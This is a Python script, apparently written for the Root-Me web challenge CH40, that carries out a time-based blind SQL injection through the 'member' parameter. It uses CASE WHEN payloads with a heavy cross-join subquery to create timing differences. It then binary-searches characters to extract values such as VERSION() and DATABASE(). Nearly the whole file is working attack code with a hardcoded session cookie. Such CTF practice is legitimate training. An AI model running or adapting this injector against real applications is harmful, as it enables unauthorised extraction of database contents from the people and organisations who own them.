#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 10 - USANDO CASE CON ELSE 0
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        self.debug = False
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        # Usamos CASE con ELSE 0
        payload = f"1 AND (CASE WHEN {condition} THEN {self.heavy} ELSE 0 END)"
        t = self.test_payload(payload, repeats=repeats)
        result = t > self.threshold
        
        if self.debug:
            print(f"  DEBUG: {condition[:40]} -> {t:.2f}ms -> {result}")
        
        return result
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  PROBANDO CASE CON ELSE 0")
print("=" * 70)

# 1. Verificar condiciones
print("\n[1] Verificando condiciones:")
injector.debug = True

tests = [
    ("1=1", "TRUE"),
    ("1=2", "FALSE"),
    ("'1'='1'", "TRUE comillas"),
    ("'1'='2'", "FALSE comillas"),
    ("ASCII('a')=97", "TRUE"),
    ("ASCII('a')=98", "FALSE"),
]

for cond, desc in tests:
    result = injector.is_true(cond, repeats=2)
    print(f"  {desc}: {result}")

injector.debug = False

# 2. Probar con valores conocidos
print("\n[2] Extrayendo 'abc'")
result = injector.extract_string("SELECT 'abc'", "abc")
print(f"  Resultado: {result}")

# 3. Probar con 123
print("\n[3] Extrayendo 123")
result = injector.extract_string("SELECT 123", "123")
print(f"  Resultado: {result}")

# 4. Probar VERSION
print("\n[4] Extrayendo VERSION()")
result = injector.extract_string("SELECT VERSION()", "Versión")
print(f"  Resultado: {result}")

# 5. Probar DATABASE
print("\n[5] Extrayendo DATABASE()")
result = injector.extract_string("SELECT DATABASE()", "Base de datos")
print(f"  Resultado: {result}")
